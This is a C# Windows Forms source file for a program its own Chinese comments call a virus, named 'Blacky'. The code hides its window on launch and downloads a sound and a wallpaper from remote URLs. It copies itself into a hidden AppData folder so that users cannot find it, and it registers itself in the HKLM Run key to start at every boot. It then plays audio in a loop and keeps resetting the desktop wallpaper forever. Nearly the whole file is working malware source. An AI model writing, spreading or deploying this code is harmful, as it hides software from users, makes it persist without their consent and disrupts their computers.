using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BlackyCSharp;

public partial class MainForm : Form
{
	[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
	public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public MainForm()
	{
		InitializeComponent();
	}

	private async void MainForm_Load(object sender, EventArgs e)
	{
		//设置病毒最小化后台运行。
		WindowState = FormWindowState.Minimized;
		ShowInTaskbar = false;
		SetVisibleCore(false);

		//从云端下载所需要的音频和壁纸文件
		var prepare = PrepareFilesAsync();
		//将病毒文件拷贝到C盘AppData文件夹下，使得其不易被用户找到，即使用户删除了初次运行病毒的目录也无法阻止其开机自启。
		var copy = TryCopyAllFilesToAppDataAsync();

		await prepare;
		bool success = await copy;

		//尝试将病毒设为开机自启。
		TrySetAutoRun(BlackyBasicDatas.TargetFullPath);

		Main();
	}

	/// <summary>
	/// 创建下载线程。
	/// </summary>
	/// <returns></returns>
	private async Task PrepareFilesAsync()
	{
		ThreadStart start = () =>
		{
			WebClient client = new WebClient();
			if (!File.Exists(BlackyBasicDatas.SoundLocation))
			{
				client.DownloadFile(BlackyBasicDatas.SndUrl, "snd.wav");
			}
			if (!File.Exists(BlackyBasicDatas.WallPaperLocation))
			{
				client.DownloadFile(BlackyBasicDatas.WppUrl, "wpp.png");
			}
		};

		Thread thread = new Thread(start);
		thread.Start();
		thread.Join();
	}

	/// <summary>
	/// 将病毒所有文件拷贝至C:\User\[本机名]\AppData\Local\Blacky\目录下。
	/// </summary>
	/// <returns></returns>
	private async Task<bool> TryCopyAllFilesToAppDataAsync()
	{
		if (BlackyBasicDatas.CurrentFullPath == BlackyBasicDatas.TargetFullPath)
		{
			return false;
		}

		string targetPath = BlackyBasicDatas.TargetPath;
		if (!Directory.Exists(targetPath))
		{
			var dir = Directory.CreateDirectory(targetPath);
			DirectoryInfo info = new DirectoryInfo(targetPath);
			info.Attributes |= FileAttributes.Hidden;
		}

		var filePaths = Directory.GetFiles(BlackyBasicDatas.CurrentPath);
		foreach (var filePath in filePaths)
		{
			string[] split = filePath.Split('\\');
			await CopyToAsync(filePath, BlackyBasicDatas.TargetPath + $@"\{split[split.Length - 1]}");
		}
		return true;
	}

	private async Task CopyToAsync(string source, string target)
	{
		string[] split = source.Split('.');
		string fileType = split[split.Length - 1];
		FileStream currentF = new FileStream(source, FileMode.Open, FileAccess.Read);
		FileStream targetF = new FileStream(target, FileMode.Create, FileAccess.Write);
		if (BlackyBasicDatas.BinFileTypes.Contains(fileType))
		{
			BinaryReader currentR = new BinaryReader(currentF);
			BinaryWriter targetW = new BinaryWriter(targetF);
			long length = currentF.Length;
			while (length > 0L)
			{
				byte[] data = currentR.ReadBytes((int)(length > int.MaxValue ? (length - int.MaxValue) : length));
				foreach (byte b in data)
				{
					targetW.Write(b);
				}
				length -= int.MaxValue;
			}
			
			targetW.Close();
			currentR.Close();
		}
		else
		{
			StreamReader currentR = new StreamReader(currentF);
			StreamWriter targetW = new StreamWriter(targetF);
			string data = await currentR.ReadToEndAsync();
			currentR.Close();
			await targetW.WriteAsync(data);
			targetW.Close();
		}

		currentF.Close();
		targetF.Close();
	}

	/// <summary>
	/// 尝试将病毒(C盘目录下的拷贝版本)设为开机自启，若已设置成功则返回false。
	/// </summary>
	/// <param name="source"></param>
	/// <returns></returns>
	private bool TrySetAutoRun(string source)
	{
		if (!File.Exists(source))
		{
			MessageBox.Show("文件不存在！！！！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
			return false;
		}

		RegistryKey reg = Registry.LocalMachine;
		RegistryKey run = reg.CreateSubKey(@"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", true);
		
		if (run.GetValue(BlackyBasicDatas.ProductName) != null)
		{
			return false;
		}

		try
		{
			run.SetValue(BlackyBasicDatas.ProductName, BlackyBasicDatas.TargetFullPath);
			reg.Close();
		}
		catch (Exception e)
		{
			MessageBox.Show(e.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
			return false;
		}

		return run.GetValue(BlackyBasicDatas.ProductName) != null;
	}

	/// <summary>
	/// 病毒主要功能：持续播放音频并不断更改用户壁纸。
	/// </summary>
	private void Main()
	{
		SoundPlayer player = new SoundPlayer();
		player.SoundLocation = BlackyBasicDatas.SoundLocation;
		player.PlayLooping();

		ThreadStart start = () =>
		{
			while (true)
			{
				if (!File.Exists(BlackyBasicDatas.WallPaperLocation))
				{
					WebClient client = new WebClient();
					client.DownloadFile(BlackyBasicDatas.WppUrl, "wpp.png");
					Thread.Sleep(3000);
				}
				SystemParametersInfo(20, 1, BlackyBasicDatas.WallPaperLocation, 1);
				Thread.Sleep(3000);
			}
		};

		Thread thread = new Thread(start);
		thread.Start();
		thread.Join();
	}
}
